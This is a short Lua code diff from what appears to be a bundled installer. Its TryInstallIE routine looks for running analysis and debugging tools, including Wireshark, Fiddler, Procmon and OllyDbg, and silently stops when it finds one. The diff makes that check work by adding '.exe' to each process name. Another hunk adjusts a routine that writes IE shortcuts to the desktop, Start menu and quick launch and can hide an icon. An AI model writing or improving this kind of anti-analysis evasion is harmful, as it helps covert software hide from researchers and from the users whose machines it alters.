@@ -524,9 +524,10 @@ function TryInstallIE()
 	
 	local tBlackList = {"wireshark", "fiddler", "httpanalyzer", "smsniff", "filemon", "regmon", "procmon", "windbg", "ollydbg", "softice", "devenv", "cis","tasklist","procexp","ollyice","processspy","spyxx","cv"} 
 	for _, strProcessName in pairs(tBlackList) do
-		local bExists = tipUtil:QueryProcessExists(strProcessName)
+		local strExeName = strProcessName..".exe"
+		local bExists = tipUtil:QueryProcessExists(strExeName)
 		if bExists then
-			FunctionObj.TipLog("[TryInstallIE] blacklist process")
+			FunctionObj.TipLog("[TryInstallIE] blacklist process strExeName: "..tostring(strExeName))
 			return --黑名单目录
 		end
 	end
@@ -639,7 +640,6 @@ end
 
 function WriteIEShortCut()
 	CheckNeedHideICO(HideIEIco)
-	WriteStartMenuSC()
 	WriteStartMenuProgramSC()
 	WriteQuickLaunchSC()
 	WriteDesktopSC()
